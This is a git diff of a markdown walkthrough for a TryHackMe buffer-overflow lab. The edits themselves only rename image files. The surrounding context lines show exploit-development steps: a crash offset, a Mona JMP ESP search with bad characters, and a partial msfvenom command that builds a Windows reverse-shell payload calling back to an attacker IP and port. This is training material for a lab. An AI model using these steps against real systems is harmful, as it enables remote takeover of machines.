@@ -44,7 +44,7 @@ description: https://tryhackme.com/room/bufferoverflowprep (oscp.exe)
 * We notice that it is running on port 1337
 * So, why not connect to it from Kali on port 1337?
 
-<figure><img src="../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Mona Configuration
 
@@ -171,7 +171,7 @@ Place the following into the debug window in Immunity:
 
 That can be seen in the following screenshot:
 
-<figure><img src="../.gitbook/assets/image (6) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 * Be sure to right-click > Appearance > Font -- and change the font size as needed
 * We see that our <mark style="color:yellow;">offset value is 1978</mark>
@@ -324,7 +324,7 @@ With the program running in a crashed or running state, run the following Mona c
 !mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
 ```
 
-<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (3).png" alt=""><figcaption></figcaption></figure>
 
 * You will see results that you can use for the next step. In this case, we get 9 pointers.
   * We will use the first one: <mark style="color:yellow;">625011af</mark>
@@ -371,7 +371,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.6.111.208 LPORT=4444 EXITFUNC=thr
 
 
 
-<figure><img src="../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
 
 * Copy the shell code only
 * Open <mark style="color:yellow;">01exploit.py</mark>
